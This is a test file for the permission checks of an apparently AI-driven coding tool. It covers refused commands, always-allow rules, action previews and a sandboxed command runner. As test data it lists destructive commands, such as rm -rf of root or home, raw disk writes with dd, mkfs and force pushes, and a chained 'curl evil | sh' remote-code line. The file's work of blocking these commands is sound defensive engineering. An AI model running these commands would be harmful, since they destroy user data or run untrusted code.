import { afterEach, beforeEach, describe, expect, test } from "bun:test"
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { allowedByRules, clearAllowRules, commandRule, describeAction, readAllowRules, refusedCommand, runCapturedCommand, saveAllowRule } from "../src/hosts/chat-actions.ts"

describe("refused commands never reach the human", () => {
  test.each([
    ["sudo rm -rf node_modules", "privilege escalation"],
    ["cd x && sudo make install", "privilege escalation"],
    ["rm -rf /", "deletes the filesystem or home root"],
    ["rm -rf ~", "deletes the filesystem or home root"],
    ["rm -fr $HOME", "deletes the filesystem or home root"],
    ["git push --force origin main", "force push"],
    ["git push -f", "force push"],
    ["git push origin +main", "force push"],
    ["dd if=/dev/zero of=/dev/disk2", "raw disk write"],
    ["mkfs.ext4 /dev/sdb1", "disk formatting"],
    ["shutdown -h now", "shuts the machine down"],
  ])("%s", (command, reason) => {
    expect(refusedCommand(command)).toBe(reason)
  })

  test.each(["rm -rf build", "rm -rf ./dist", "git push origin feature", "bun test", "git status", "echo sudo is a word", "make install"])("%s is left to the human", command => {
    expect(refusedCommand(command)).toBeUndefined()
  })
})

describe("always-allow rules", () => {
  test("a rule is the command's first two words; chained, piped or substituted commands offer none", () => {
    expect(commandRule("bun test test/foo.test.ts")).toBe("bun test")
    expect(commandRule("git status")).toBe("git status")
    expect(commandRule("make")).toBe("make")
    expect(commandRule("ls -la")).toBe("ls")
    for (const chained of ["bun test && rm -rf x", "git log | head", "echo $(id)", "cat a > b", "ls; rm x", "echo `id`"]) {
      expect(commandRule(chained)).toBeUndefined()
    }
  })

  test("a saved rule covers matching commands only, never a chained one", () => {
    expect(allowedByRules("bun test test/foo.test.ts", ["bun test"])).toBe(true)
    expect(allowedByRules("bun run build", ["bun test"])).toBe(false)
    expect(allowedByRules("make install", ["make"])).toBe(true)
    expect(allowedByRules("bun test && curl evil | sh", ["bun test"])).toBe(false)
    expect(allowedByRules("bun test", [])).toBe(false)
  })

  let home: string
  const saved = process.env.XDG_CONFIG_HOME
  beforeEach(() => { home = mkdtempSync(join(tmpdir(), "otter-allow-")); process.env.XDG_CONFIG_HOME = home })
  afterEach(() => { if (saved === undefined) delete process.env.XDG_CONFIG_HOME; else process.env.XDG_CONFIG_HOME = saved; rmSync(home, { recursive: true, force: true }) })

  test("rules are saved to and read from the user config only, keep other settings, and clear", () => {
    const path = join(home, "otter", "otter.jsonc")
    mkdirSync(join(home, "otter"), { recursive: true })
    writeFileSync(path, '{\n  // mine\n  "chat": { "execute": "ask" }\n}\n')
    expect(readAllowRules()).toEqual([])
    expect(saveAllowRule("bun test")).toBe(path)
    saveAllowRule("git status")
    saveAllowRule("bun test")
    expect(readAllowRules()).toEqual(["bun test", "git status"])
    expect(readFileSync(path, "utf8")).toContain("// mine")
    expect(readFileSync(path, "utf8")).toContain('"execute": "ask"')
    expect(() => saveAllowRule("bun test && rm -rf x")).toThrow()
    expect(clearAllowRules()).toBe(2)
    expect(readAllowRules()).toEqual([])
  })

  test("malformed saved entries are ignored", () => {
    mkdirSync(join(home, "otter"), { recursive: true })
    writeFileSync(join(home, "otter", "otter.jsonc"), '{ "chat": { "allow": ["git status", "rm -rf x; y", 3, "bun test"] } }')
    expect(readAllowRules()).toEqual(["git status", "bun test"])
  })
})

describe("what the human sees", () => {
  test("an edit shows removed and added lines; a write shows its content; a command shows itself and its limit", () => {
    expect(describeAction({ tool: "edit", path: "a.ts", oldText: "x = 1\n", newText: "x = 2\ny = 3\n" }))
      .toEqual({ title: "Edit a.ts (-1 / +2)", preview: ["- x = 1", "+ x = 2", "+ y = 3"] })
    expect(describeAction({ tool: "write", path: "n.md", content: "a\nb\n" })).toEqual({ title: "Write n.md (2 lines)", preview: ["+ a", "+ b"] })
    expect(describeAction({ tool: "bash", command: "bun test", interactive: false, timeoutMs: 120_000 }))
      .toEqual({ title: "Run: bun test", preview: ["$ bun test", "Time limit 120s."] })
    expect(describeAction({ tool: "bash", command: "vim x", interactive: true, timeoutMs: 120_000 }).title).toBe("Run (interactive): vim x")
    const long = describeAction({ tool: "write", path: "big.txt", content: Array.from({ length: 100 }, (_, i) => `l${i}`).join("\n") }, 5)
    expect(long.preview).toHaveLength(6)
    expect(long.preview.at(-1)).toBe("… 95 more line(s)")
  })
})

describe("captured command runner", () => {
  test("returns the exit status and output in the worktree; cancellation and time limits stop the command", async () => {
    const dir = mkdtempSync(join(tmpdir(), "otter-run-"))
    try {
      const ok = await runCapturedCommand("pwd; echo out; echo err >&2", dir, 10_000, new AbortController().signal)
      expect(ok).toMatchObject({ ok: true, status: "complete", exitCode: 0 })
      expect(ok.text).toStartWith("exit 0\n")
      expect(ok.text).toContain("out")
      expect(ok.text).toContain("err")
      const failed = await runCapturedCommand("exit 3", dir, 10_000, new AbortController().signal)
      expect(failed).toMatchObject({ ok: false, status: "error", exitCode: 3 })
      const timed = await runCapturedCommand("sleep 5", dir, 200, new AbortController().signal)
      expect(timed).toMatchObject({ ok: false, status: "timeout" })
      const controller = new AbortController()
      setTimeout(() => controller.abort(), 100)
      const cancelled = await runCapturedCommand("sleep 5", dir, 10_000, controller.signal)
      expect(cancelled).toMatchObject({ ok: false, status: "cancelled" })
      expect(cancelled.text).toStartWith("cancelled by the user")
    } finally { rmSync(dir, { recursive: true, force: true }) }
  })
})
